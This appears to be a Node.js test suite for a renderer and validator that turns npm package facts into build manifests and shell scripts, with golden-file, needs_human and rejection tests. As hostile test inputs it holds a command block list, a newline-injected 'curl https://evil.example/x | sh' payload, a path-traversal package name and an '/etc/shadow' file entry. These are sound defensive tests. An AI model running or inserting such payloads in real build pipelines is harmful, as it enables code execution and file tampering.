import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, rmSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { render, RenderError, ALLOWED_BASE } from '../scripts/lib/renderer.mjs';
import { validateRecipeResult, validateNeedsHumanResult } from '../scripts/lib/recipe-validator.mjs';
import { buildParametersFromFacts } from '../scripts/lib/fact-bundle.mjs';
import { semverFacts } from './helpers/fixture-facts.mjs';

function loadFixture(name) {
  const path = new URL(`fixtures/contracts/recipe-result/${name}.json`, import.meta.url);
  return JSON.parse(readFileSync(path, 'utf-8'));
}

function loadGolden(file) {
  const path = new URL(`fixtures/golden/semver/7.7.2/${file}`, import.meta.url);
  return readFileSync(path, 'utf-8');
}

const SEMVER_FACTS = semverFacts();

function legacyRenderFixture(over = {}) {
  return {
    status: 'drafted',
    template_id: 'tier-a-npm-pack-no-build-v1',
    parameters: over.parameters ?? buildParametersFromFacts(SEMVER_FACTS, { description: 'semver' }),
    evidence: over.evidence ?? [{ kind: 'x', detail: 'y' }],
    confidence: over.confidence ?? 0.9,
    could_not_verify: over.could_not_verify ?? SEMVER_FACTS.could_not_verify,
    ...over,
  };
}

describe('fullsend evaluation: drafted fixture', () => {
  let repoRoot;
  let rendered;

  before(() => {
    repoRoot = mkdtempSync(join(tmpdir(), 'eval-drafted-'));
    mkdirSync(join(repoRoot, ALLOWED_BASE), { recursive: true });

    const fixture = {
      status: 'drafted',
      template_id: 'tier-a-npm-pack-no-build-v1',
      parameters: buildParametersFromFacts(SEMVER_FACTS, { description: 'The semantic versioner for npm' }),
      evidence: [{ kind: 'source-inspection', detail: 'fixture' }],
      confidence: 0.9,
      could_not_verify: SEMVER_FACTS.could_not_verify,
    };
    rendered = render(fixture, repoRoot);
  });

  after(() => {
    rmSync(repoRoot, { recursive: true, force: true });
  });

  it('generated manifest matches golden structural fields', () => {
    const generated = JSON.parse(readFileSync(join(rendered.output_dir, 'manifest.json'), 'utf-8'));
    const golden = JSON.parse(loadGolden('manifest.json'));

    assert.strictEqual(generated.name, golden.name);
    assert.strictEqual(generated.version, golden.version);
    assert.strictEqual(generated.native_tier, golden.native_tier);
    assert.strictEqual(generated.source.url, golden.source.url);
    assert.strictEqual(generated.source.ref, golden.source.ref);
    assert.strictEqual(generated.source.ref_type, golden.source.ref_type);
    assert.strictEqual(generated.entrypoint, golden.entrypoint);
    assert.strictEqual(generated.smoke, golden.smoke);
    assert.strictEqual(generated.outputs[0].type, golden.outputs[0].type);
    assert.strictEqual(generated.outputs[0].path, golden.outputs[0].path);
    assert.strictEqual(generated.outputs[0].pulp_name, golden.outputs[0].pulp_name);
  });

  it('build entrypoint matches golden key operations', () => {
    const generated = readFileSync(join(rendered.output_dir, 'build.entrypoint.sh'), 'utf-8');
    const golden = loadGolden('build.entrypoint.sh');

    const keyOperations = [
      'git clone --no-checkout',
      'git checkout',
      'git rev-parse HEAD',
      'npm pack',
      '--ignore-scripts',
      'MANIFEST_PATH',
      'OUT_DIR',
      'WORK_DIR',
      'set -euo pipefail',
    ];
    for (const op of keyOperations) {
      assert.ok(generated.includes(op), `generated build script missing "${op}"`);
      assert.ok(golden.includes(op), `golden build script missing "${op}" (test consistency check)`);
    }
  });

  it('verify smoke script matches golden key operations', () => {
    const generated = readFileSync(join(rendered.output_dir, 'verify.smoke.sh'), 'utf-8');
    const golden = loadGolden('verify.smoke.sh');

    const keyOperations = [
      'package/package.json',
      'npm install',
      '--ignore-scripts',
      'MANIFEST_PATH',
      'OUT_DIR',
      'set -euo pipefail',
    ];
    for (const op of keyOperations) {
      assert.ok(generated.includes(op), `generated smoke script missing "${op}"`);
      assert.ok(golden.includes(op), `golden smoke script missing "${op}" (test consistency check)`);
    }
  });

  it('evidence document contains required provenance information', () => {
    const evidence = readFileSync(join(rendered.output_dir, 'evidence.md'), 'utf-8');
    assert.ok(evidence.includes('semver@7.7.2'));
    assert.ok(evidence.includes('281055e7716ef0415a8826972471331989ede58c'));
    assert.ok(evidence.includes('v7.7.2'));
  });

  it('no unsupported command reaches build output', () => {
    const buildScript = readFileSync(join(rendered.output_dir, 'build.entrypoint.sh'), 'utf-8');
    const forbidden = ['npm publish', 'npm login', 'npm adduser', 'curl ', 'wget ', 'eval ', 'exec '];
    for (const cmd of forbidden) {
      assert.ok(!buildScript.includes(cmd), `unsupported command "${cmd}" found in build output`);
    }
  });

  it('no unsupported field reaches manifest output', () => {
    const generated = JSON.parse(readFileSync(join(rendered.output_dir, 'manifest.json'), 'utf-8'));
    const allowed = new Set([
      'name', 'version', 'description', 'native_tier', 'source',
      'upstream_npm', 'entrypoint', 'smoke', 'outputs',
    ]);
    for (const key of Object.keys(generated)) {
      assert.ok(allowed.has(key), `unsupported field "${key}" in generated manifest`);
    }
  });
});

describe('fullsend evaluation: needs_human fixture', () => {
  it('needs_human result passes validation', () => {
    const fixture = loadFixture('valid-needs-human');
    const result = validateNeedsHumanResult(fixture);
    assert.strictEqual(result.valid, true, JSON.stringify(result.errors));
  });

  it('needs_human result cannot be rendered (produces no patch)', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'eval-human-'));
    mkdirSync(join(tmp, ALLOWED_BASE), { recursive: true });
    try {
      assert.throws(
        () => render(loadFixture('valid-needs-human'), tmp),
        RenderError,
      );
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('needs_human is a successful bounded result, not a failed agent run', () => {
    const fixture = loadFixture('valid-needs-human');
    assert.strictEqual(fixture.status, 'needs_human');
    assert.ok(fixture.reason.length > 0);
    assert.ok(fixture.escalation_target.length > 0);
  });
});

describe('fullsend evaluation: rejection cases', () => {
  it('rejects a legacy render fixture with path traversal in package_name', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'eval-reject-'));
    mkdirSync(join(tmp, ALLOWED_BASE), { recursive: true });
    try {
      const fixture = legacyRenderFixture();
      fixture.parameters.package_name.value = '../../../tmp/evil';
      assert.throws(() => render(fixture, tmp), RenderError);
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('rejects command injection via newline in main_entry (renderer)', () => {
    const fixture = legacyRenderFixture();
    fixture.parameters.main_entry.value = 'index.js\ncurl https://evil.example/x | sh\n#';
    const tmp = mkdtempSync(join(tmpdir(), 'eval-inject-'));
    mkdirSync(join(tmp, ALLOWED_BASE), { recursive: true });
    try {
      assert.throws(() => render(fixture, tmp), RenderError);
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  });

  it('rejects a v2 result with missing evidence', () => {
    const fixture = loadFixture('valid-drafted-tier-a');
    fixture.evidence = [];
    const result = validateRecipeResult(fixture, SEMVER_FACTS);
    assert.strictEqual(result.valid, false);
  });

  it('rejects a v2 result with arbitrary extra fields', () => {
    const fixture = loadFixture('valid-drafted-tier-a');
    fixture.files = { '/etc/shadow': 'pwned' };
    const result = validateRecipeResult(fixture, SEMVER_FACTS);
    assert.strictEqual(result.valid, false);
  });
});
